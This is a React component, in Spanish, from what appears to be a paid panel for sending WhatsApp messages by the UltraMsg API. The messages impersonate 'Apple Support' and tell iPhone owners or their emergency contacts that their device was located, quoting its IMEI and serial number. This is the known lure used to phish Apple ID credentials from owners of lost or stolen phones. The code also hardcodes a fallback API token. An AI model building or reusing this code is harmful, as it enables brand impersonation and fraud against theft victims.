
import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { toast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';
import { MessageSquare, Eye, Trash2 } from 'lucide-react';

interface Process {
  id: string;
  client_name: string;
  phone_number: string;
  country_code: string;
  contact_type: string;
  iphone_model: string;
  storage: string;
  color: string;
  imei: string;
  serial_number: string;
  url?: string;
  status: string;
  created_at: string;
}

const ProcessList = () => {
  const [processes, setProcesses] = useState<Process[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [instanceConfig, setInstanceConfig] = useState({
    instance: '',
    token: ''
  });

  useEffect(() => {
    loadProcesses();
    loadInstanceConfig();
  }, []);

  const loadProcesses = async () => {
    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) return;

      const { data, error } = await supabase
        .from('processes')
        .select('*')
        .eq('user_id', user.id)
        .order('created_at', { ascending: false });

      if (error) throw error;
      setProcesses(data || []);
    } catch (error) {
      console.error('Error loading processes:', error);
      toast({
        title: "Error",
        description: "Error al cargar los procesos",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const loadInstanceConfig = async () => {
    try {
      const { data } = await supabase
        .from('system_settings')
        .select('*')
        .in('setting_key', ['whatsapp_instance', 'whatsapp_token']);

      const settings = data?.reduce((acc: any, setting: any) => {
        acc[setting.setting_key] = setting.setting_value;
        return acc;
      }, {});

      setInstanceConfig({
        instance: settings?.whatsapp_instance || 'instance126876',
        token: settings?.whatsapp_token || '4ecj8581tubua7ry'
      });
    } catch (error) {
      console.error('Error loading instance config:', error);
    }
  };

  const generateMessage = (process: Process, isEmergency: boolean = false) => {
    const baseMessage = isEmergency 
      ? `Soporte de Apple 👨🏽‍🔧

🚨 Usted ha sido registrado como contacto de emergencia.

✅ iPhone localizado con éxito

📱 Modelo: ${process.iphone_model}
💾 Almacenamiento: ${process.storage}
🎨 Color: ${process.color}
📟 IMEI: ${process.imei}
🔑 Serie: ${process.serial_number}

🧾 Escribe la palabra Menu para solicitar asistencia.`
      : `Soporte de Apple 👨🏽‍🔧

✅ iPhone localizado con éxito

📱 Modelo: ${process.iphone_model}
💾 Almacenamiento: ${process.storage}
🎨 Color: ${process.color}
📟 IMEI: ${process.imei}
🔑 Serie: ${process.serial_number}
🗺 Departamento: 

🧾 Escribe la palabra Menu para solicitar asistencia.`;

    return baseMessage;
  };

  const sendMessage = async (process: Process) => {
    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) return;

      // Check user credits
      const { data: profile } = await supabase
        .from('profiles')
        .select('credits')
        .eq('id', user.id)
        .single();

      if (!profile || profile.credits <= 0) {
        toast({
          title: "Sin créditos",
          description: "No tienes créditos suficientes para enviar mensajes",
          variant: "destructive",
        });
        return;
      }

      const isEmergency = process.contact_type === 'emergencia';
      const message = generateMessage(process, isEmergency);
      const phoneNumber = `${process.country_code}${process.phone_number}`;

      // Send message via WhatsApp API
      const response = await fetch(`https://api.ultramsg.com/${instanceConfig.instance}/messages/chat`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          token: instanceConfig.token,
          to: phoneNumber,
          body: message,
        }),
      });

      if (!response.ok) {
        throw new Error('Error al enviar mensaje');
      }

      // Save message to database
      const { error: messageError } = await supabase
        .from('messages')
        .insert({
          user_id: user.id,
          process_id: process.id,
          message_content: message,
          recipient_phone: phoneNumber,
          status: 'sent'
        });

      if (messageError) throw messageError;

      // Deduct credit
      const { error: creditError } = await supabase
        .from('profiles')
        .update({ credits: profile.credits - 1 })
        .eq('id', user.id);

      if (creditError) throw creditError;

      // Update process status
      const { error: statusError } = await supabase
        .from('processes')
        .update({ status: 'enviado' })
        .eq('id', process.id);

      if (statusError) throw statusError;

      toast({
        title: "Mensaje enviado",
        description: `Mensaje enviado a ${phoneNumber}`,
      });

      loadProcesses();

    } catch (error) {
      console.error('Error sending message:', error);
      toast({
        title: "Error",
        description: "Error al enviar el mensaje",
        variant: "destructive",
      });
    }
  };

  const deleteProcess = async (processId: string) => {
    try {
      const { error } = await supabase
        .from('processes')
        .delete()
        .eq('id', processId);

      if (error) throw error;

      toast({
        title: "Proceso eliminado",
        description: "El proceso se ha eliminado exitosamente",
      });

      loadProcesses();
    } catch (error) {
      console.error('Error deleting process:', error);
      toast({
        title: "Error",
        description: "Error al eliminar el proceso",
        variant: "destructive",
      });
    }
  };

  if (isLoading) {
    return (
      <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
        <CardContent className="p-6">
          <p className="text-blue-200/70">Cargando procesos...</p>
        </CardContent>
      </Card>
    );
  }

  return (
    <div className="space-y-4">
      {processes.length === 0 ? (
        <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
          <CardContent className="p-6">
            <p className="text-blue-200/70">No hay procesos guardados aún.</p>
          </CardContent>
        </Card>
      ) : (
        processes.map((process) => (
          <Card key={process.id} className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
            <CardHeader>
              <div className="flex justify-between items-start">
                <div>
                  <CardTitle className="text-blue-300">{process.client_name}</CardTitle>
                  <p className="text-blue-200/70 text-sm">
                    {process.country_code}{process.phone_number} • {process.contact_type}
                  </p>
                </div>
                <Badge 
                  variant={process.status === 'enviado' ? 'default' : 'secondary'}
                  className={process.status === 'enviado' ? 'bg-green-600' : 'bg-yellow-600'}
                >
                  {process.status}
                </Badge>
              </div>
            </CardHeader>
            <CardContent>
              <div className="grid grid-cols-2 gap-4 mb-4">
                <div>
                  <p className="text-blue-200/70 text-xs">Modelo</p>
                  <p className="text-blue-200">{process.iphone_model}</p>
                </div>
                <div>
                  <p className="text-blue-200/70 text-xs">Almacenamiento</p>
                  <p className="text-blue-200">{process.storage}</p>
                </div>
                <div>
                  <p className="text-blue-200/70 text-xs">Color</p>
                  <p className="text-blue-200">{process.color}</p>
                </div>
                <div>
                  <p className="text-blue-200/70 text-xs">IMEI</p>
                  <p className="text-blue-200">{process.imei}</p>
                </div>
              </div>
              
              <div className="flex space-x-2">
                <Button
                  onClick={() => sendMessage(process)}
                  disabled={process.status === 'enviado'}
                  className="bg-green-600 hover:bg-green-700"
                  size="sm"
                >
                  <MessageSquare className="h-4 w-4 mr-1" />
                  Enviar Mensaje
                </Button>
                
                <Button
                  onClick={() => deleteProcess(process.id)}
                  variant="destructive"
                  size="sm"
                >
                  <Trash2 className="h-4 w-4 mr-1" />
                  Eliminar
                </Button>
              </div>
            </CardContent>
          </Card>
        ))
      )}
    </div>
  );
};

export default ProcessList;
